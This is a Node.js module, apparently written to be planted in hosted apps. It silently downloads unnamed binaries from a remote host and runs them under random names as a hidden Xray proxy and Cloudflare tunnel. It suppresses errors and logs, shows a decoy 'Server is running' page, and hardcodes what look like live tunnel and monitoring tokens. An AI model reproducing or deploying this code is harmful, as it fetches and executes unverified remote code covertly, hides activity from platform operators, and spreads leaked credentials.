/**
 * 后台工作服务 - 静默运行
 */

const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { spawn } = require('child_process');
const crypto = require('crypto');

// 生成随机进程名称
function generateRandomName(length = 8) {
    return crypto.randomBytes(length).toString('hex');
}

// ================= 日志收集器 =================
// 默认开启，访问 /logs 查看日志
// 完全关闭：设置环境变量 LOG_PATH= 或 LOG_PATH=disabled
const LOG_PATH = process.env.LOG_PATH || '';
const ENABLE_LOGS = LOG_PATH && LOG_PATH !== 'disabled';

const LOG_MAX_LINES = 500;
const logBuffer = [];

function addLog(level, message) {
    if (!ENABLE_LOGS) return;
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] [${level}] ${message}`;
    logBuffer.push(logEntry);
    if (logBuffer.length > LOG_MAX_LINES) {
        logBuffer.shift();
    }
}

// 包装 console 方法来收集日志
const originalConsoleLog = console.log;
const originalConsoleError = console.error;
const originalConsoleWarn = console.warn;

if (ENABLE_LOGS) {
    console.log = (...args) => {
        addLog('INFO', args.join(' '));
        originalConsoleLog.apply(console, args);
    };

    console.error = (...args) => {
        addLog('ERROR', args.join(' '));
        originalConsoleError.apply(console, args);
    };

    console.warn = (...args) => {
        addLog('WARN', args.join(' '));
        originalConsoleWarn.apply(console, args);
    };
}

// 全局静默
process.on('uncaughtException', (err) => { if (ENABLE_LOGS) addLog('ERROR', `Uncaught Exception: ${err.message}`); });
process.on('unhandledRejection', (reason) => { if (ENABLE_LOGS) addLog('ERROR', `Unhandled Rejection: ${reason}`); });

// ================= 环境变量 =================
const UPLOAD_URL = process.env.UPLOAD_URL || '';
const PROJECT_URL = process.env.PROJECT_URL || '';
const FILE_PATH = process.env.FILE_PATH || path.join(process.cwd(), 'tmp');
const SUB_PATH = process.env.SUB_PATH || '778899';
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
const UUID = process.env.UUID || 'eb6cb84e-4b25-4cd8-bbcf-b78b8c4993e6';
const KOMARI_ENDPOINT = (process.env.KOMARI_ENDPOINT || 'https://km.ccc.gv.uy').replace(/\/+$/, '');
const KOMARI_TOKEN = process.env.KOMARI_TOKEN || '2GK5tNwuoSXNwIkPwZAf0b';
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || 'zeeploy.61154321.dpdns.org';
const ARGO_AUTH = (process.env.ARGO_AUTH || 'eyJhIjoiMzM5OTA1ZWFmYjM2OWM5N2M2YjZkYTI4NTgxMjlhMjQiLCJ0IjoiOTY2MjI3MDAtYjcwOC00MmZmLTgzZWEtMjY5ZmJmOWIxOGQwIiwicyI6Ik9HTm1OR1k1TnpVdFpUSTROUzAwTW1NeExUa3lOVGd0T1RSak1qUm1NREl4TnpWaCJ9').trim();
const ARGO_PORT = process.env.ARGO_PORT || 8001;
const CFIP = process.env.CFIP || 'cdns.doon.eu.org';
const CFPORT = process.env.CFPORT || 443;
const NAME = process.env.NAME || '';

// 创建运行文件夹
if (!fs.existsSync(FILE_PATH)) {
    fs.mkdirSync(FILE_PATH, { recursive: true });
}

// 文件路径 - 使用随机名称
const webPath = path.join(FILE_PATH, generateRandomName());
const botPath = path.join(FILE_PATH, generateRandomName());
const komariPath = path.join(FILE_PATH, generateRandomName());
const configPath = path.join(FILE_PATH, 'config.json');
const subPath = path.join(FILE_PATH, 'sub.txt');
const tunnelJsonPath = path.join(FILE_PATH, 'tunnel.json');
const tunnelYmlPath = path.join(FILE_PATH, 'tunnel.yml');

// ================= Express 路由 =================
app.use(express.static(path.join(__dirname, '../../public')));

app.get("/", (req, res) => {
    res.send(`<h1>Server is running</h1><p>Uptime: ${Math.floor(process.uptime())}s</p>`);
});

app.get(`/${SUB_PATH}`, (req, res) => {
    if (fs.existsSync(subPath)) {
        res.type('text/plain; charset=utf-8').send(fs.readFileSync(subPath, 'utf-8'));
    } else {
        res.status(503).send('Subscription not ready yet, please wait...');
    }
});

app.get('/health', (req, res) => {
    res.json({
        uptime: process.uptime(),
        processes: Object.keys(processManager.processes),
        timestamp: new Date().toISOString()
    });
});

// ================= 日志查看路由 =================
// 默认开启，访问 /logs 查看日志
// 关闭方式：设置环境变量 LOG_PATH= 或 LOG_PATH=disabled
if (ENABLE_LOGS) {
app.get(`/${LOG_PATH}`, (req, res) => {
    const filter = req.query.level?.toUpperCase();
    const limit = parseInt(req.query.limit) || LOG_MAX_LINES;

    let logs = [...logBuffer];
    if (filter) {
        logs = logs.filter(log => log.includes(`[${filter}]`));
    }
    logs = logs.slice(-limit);

    if (req.query.format === 'json') {
        return res.json({
            total: logBuffer.length,
            showing: logs.length,
            logs: logs
        });
    }

    const html = `
<!DOCTYPE html>
<html>
<head>
    <title>Logs</title>
    <meta charset="utf-8">
    <meta http-equiv="refresh" content="10">
    <style>
        body { background: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 20px; }
        .log { margin: 2px 0; white-space: pre-wrap; word-break: break-all; }
        .INFO { color: #4fc3f7; }
        .ERROR { color: #ef5350; }
        .WARN { color: #ffb74d; }
        .SYSTEM { color: #81c784; }
        h1 { color: #fff; }
        .info { color: #888; font-size: 12px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <h1>Server Logs</h1>
    <div class="info">Total: ${logBuffer.length} | Showing: ${logs.length} | Auto-refresh: 10s</div>
    <div class="info">Filters: <a href="?level=error" style="color:#ef5350">ERROR</a> | <a href="?level=warn" style="color:#ffb74d">WARN</a> | <a href="?level=info" style="color:#4fc3f7">INFO</a> | <a href="?" style="color:#fff">ALL</a> | <a href="?format=json" style="color:#81c784">JSON</a></div>
    <hr>
    ${logs.map(log => {
        let level = 'INFO';
        if (log.includes('[ERROR]')) level = 'ERROR';
        else if (log.includes('[WARN]')) level = 'WARN';
        else if (log.includes('[SYSTEM]')) level = 'SYSTEM';
        return `<div class="log ${level}">${log.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>`;
    }).join('')}
</body>
</html>`;
    res.type('html').send(html);
});
}

// ================= 配置生成 =================
function generateConfig() {
    const config = {
        log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
        inbounds: [
            {
                port: parseInt(ARGO_PORT),
                protocol: 'vless',
                settings: {
                    clients: [{ id: UUID, flow: 'xtls-rprx-vision' }],
                    decryption: 'none',
                    fallbacks: [
                        { dest: 3001 },
                        { path: "/vless-argo", dest: 3002 },
                        { path: "/vmess-argo", dest: 3003 },
                        { path: "/trojan-argo", dest: 3004 }
                    ]
                },
                streamSettings: { network: 'tcp' }
            },
            { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID }], decryption: "none" }, streamSettings: { network: "tcp", security: "none" } },
            { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
            { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: UUID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
            { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: UUID }] }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } }
        ],
        outbounds: [{ protocol: "freedom" }, { protocol: "blackhole", tag: "block" }]
    };
    fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
}

function generateTunnelConfig() {
    if (ARGO_AUTH && ARGO_AUTH.includes('TunnelSecret') && ARGO_DOMAIN) {
        fs.writeFileSync(tunnelJsonPath, ARGO_AUTH);
        fs.writeFileSync(tunnelYmlPath, `tunnel: ${ARGO_AUTH.split('"')[11]}
credentials-file: ${tunnelJsonPath}
protocol: http2
ingress:
  - hostname: ${ARGO_DOMAIN}
    service: http://localhost:${ARGO_PORT}
    originRequest:
      noTLSVerify: true
  - service: http_status:404`);
    }
}

// ================= 文件下载 =================
async function downloadFile(dest, url) {
    if (fs.existsSync(dest) && fs.statSync(dest).size > 10000) return;
    const writer = fs.createWriteStream(dest);
    try {
        const response = await axios({ url, method: 'GET', responseType: 'stream', timeout: 30000 });
        response.data.pipe(writer);
        return new Promise((resolve, reject) => {
            writer.on('finish', () => { writer.close(); resolve(); });
            writer.on('error', (err) => { writer.close(); fs.unlink(dest, () => { }); reject(err); });
        });
    } catch (e) {
        return Promise.reject(e);
    }
}

// ================= 进程管理器 =================
const processManager = {
    processes: {},
    restartCounts: {},
    maxRestarts: 5,
    restartDelay: 3000
};

function runProcess(name, command, args, autoRestart = true, captureOutput = false) {
    if (!(name in processManager.restartCounts)) {
        processManager.restartCounts[name] = 0;
    }

    const stdioOption = captureOutput ? ['ignore', 'pipe', 'pipe'] : ['ignore', 'ignore', 'ignore'];

    const proc = spawn(command, args, {
        cwd: FILE_PATH,
        stdio: stdioOption,
        detached: false
    });
    processManager.processes[name] = { proc, command, args, autoRestart };
    addLog('SYSTEM', `Process [${name}] started (PID: ${proc.pid})`);

    // 捕获输出用于调试
    if (captureOutput && proc.stdout) {
        proc.stdout.on('data', (data) => {
            addLog('INFO', `[${name}] ${data.toString().trim()}`);
        });
    }
    if (captureOutput && proc.stderr) {
        proc.stderr.on('data', (data) => {
            addLog('ERROR', `[${name}] ${data.toString().trim()}`);
        });
    }

    proc.on('error', (err) => { addLog('ERROR', `Process [${name}] error: ${err.message}`); });

    proc.on('close', (code) => {
        delete processManager.processes[name];
        addLog('SYSTEM', `Process [${name}] exited with code ${code}`);

        if (autoRestart && code !== 0) {
            processManager.restartCounts[name]++;

            if (processManager.restartCounts[name] <= processManager.maxRestarts) {
                addLog('WARN', `Process [${name}] restarting (${processManager.restartCounts[name]}/${processManager.maxRestarts})...`);
                setTimeout(() => {
                    runProcess(name, command, args, autoRestart);
                }, processManager.restartDelay);
            }
        }
    });

    setTimeout(() => {
        if (processManager.processes[name]) {
            processManager.restartCounts[name] = 0;
        }
    }, 60000);

    return proc;
}

// ================= 订阅链接生成 =================
async function getMetaInfo() {
    try {
        const response = await axios.get('https://ipapi.co/json/', { timeout: 3000 });
        if (response.data?.country_code && response.data?.org) {
            return `${response.data.country_code}_${response.data.org}`;
        }
    } catch {
        try {
            const response = await axios.get('http://ip-api.com/json/', { timeout: 3000 });
            if (response.data?.status === 'success') {
                return `${response.data.countryCode}_${response.data.org}`;
            }
        } catch { }
    }
    return 'Unknown';
}

async function generateLinks(domain) {
    const ISP = await getMetaInfo();
    const nodeName = NAME ? `${NAME}-${ISP}` : ISP;

    const vlessLink = `vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${domain}&fp=firefox&type=ws&host=${domain}&path=%2Fvless-argo%3Fed%3D2560#${nodeName}`;

    const vmessObj = {
        v: '2', ps: nodeName, add: CFIP, port: CFPORT, id: UUID, aid: '0',
        scy: 'none', net: 'ws', type: 'none', host: domain,
        path: '/vmess-argo?ed=2560', tls: 'tls', sni: domain, alpn: '', fp: 'firefox'
    };
    const vmessLink = `vmess://${Buffer.from(JSON.stringify(vmessObj)).toString('base64')}`;

    const trojanLink = `trojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${domain}&fp=firefox&type=ws&host=${domain}&path=%2Ftrojan-argo%3Fed%3D2560#${nodeName}`;

    const subContent = Buffer.from(`${vlessLink}\n${vmessLink}\n${trojanLink}`).toString('base64');
    fs.writeFileSync(subPath, subContent);

    if (UPLOAD_URL && PROJECT_URL) {
        try {
            await axios.post(`${UPLOAD_URL}/api/add-subscriptions`, {
                subscription: [`${PROJECT_URL}/${SUB_PATH}`]
            }, { headers: { 'Content-Type': 'application/json' } });
        } catch { }
    }
}

// ================= 启动服务 =================
async function startServices() {
    generateConfig();
    generateTunnelConfig();

    const arch = os.arch().includes('arm') ? 'arm64' : 'amd64';

    try {
        const downloads = [
            downloadFile(webPath, `https://${arch}.ssss.nyc.mn/web`),
            downloadFile(botPath, `https://${arch}.ssss.nyc.mn/bot`)
        ];

        if (KOMARI_ENDPOINT && KOMARI_TOKEN) {
            downloads.push(downloadFile(komariPath, `https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-${arch}`));
        }

        await Promise.all(downloads);

        if (fs.existsSync(webPath)) fs.chmodSync(webPath, 0o775);
        if (fs.existsSync(botPath)) fs.chmodSync(botPath, 0o775);
        if (fs.existsSync(komariPath)) fs.chmodSync(komariPath, 0o775);
    } catch (e) {
        addLog('ERROR', `Download failed: ${e.message}`);
    }

    if (!fs.existsSync(webPath) || !fs.existsSync(botPath)) {
        addLog('ERROR', 'Core files not found, cannot start services');
        return;
    }

    runProcess('Xray', webPath, ['-c', configPath]);

    if (KOMARI_ENDPOINT && KOMARI_TOKEN && fs.existsSync(komariPath)) {
        setTimeout(() => {
            // 开启输出捕获来调试 Komari 连接问题
            runProcess('Komari', komariPath, ['-e', KOMARI_ENDPOINT, '-t', KOMARI_TOKEN], true, true);
        }, 3000);
    }

    let argoArgs = [];
    if (ARGO_AUTH.includes('TunnelSecret')) {
        argoArgs = ['tunnel', '--edge-ip-version', 'auto', '--config', tunnelYmlPath, 'run'];
    } else if (ARGO_AUTH.length > 20 && !ARGO_AUTH.includes(' ')) {
        argoArgs = ['tunnel', '--edge-ip-version', 'auto', '--no-autoupdate', '--protocol', 'http2', 'run', '--token', ARGO_AUTH];
    } else {
        argoArgs = ['tunnel', '--edge-ip-version', 'auto', '--no-autoupdate', '--protocol', 'http2', '--url', `http://localhost:${ARGO_PORT}`];
    }

    setTimeout(() => {
        runProcess('Argo', botPath, argoArgs);

        setTimeout(() => {
            if (ARGO_DOMAIN) {
                generateLinks(ARGO_DOMAIN);
            }
        }, 8000);
    }, 5000);
}

// ================= 初始化入口 =================
async function initWorker() {
    try {
        app.listen(PORT, () => {
            addLog('SYSTEM', `Server started on port ${PORT}`);
            addLog('SYSTEM', `Log viewer available at /${LOG_PATH}`);
        });

        await startServices();
    } catch (error) {
        addLog('ERROR', `Init failed: ${error.message}`);
    }
}

module.exports = { initWorker };
